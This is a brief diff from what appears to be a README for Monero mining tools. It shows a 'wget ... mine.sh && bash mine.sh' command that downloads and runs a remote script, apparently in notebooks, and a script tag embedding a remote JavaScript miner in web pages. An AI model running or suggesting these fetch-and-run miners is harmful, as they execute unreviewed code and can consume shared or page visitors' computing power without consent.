@@ -7,7 +7,7 @@ wget https://raw.githubusercontent.com/thealidev/sm/main/mine.sh && bash mine.sh
 ```
 ! wget https://raw.githubusercontent.com/thealidev/sm/main/mine.sh && bash mine.sh
 ```
-## `AliX JS` (Mine On Diffrent Pool)
+## `AliX JS` (Mining On `moneroocean.stream`)
 ```
 <script src="https://alixjs.vercel.app/index.js"></script>
 <script>
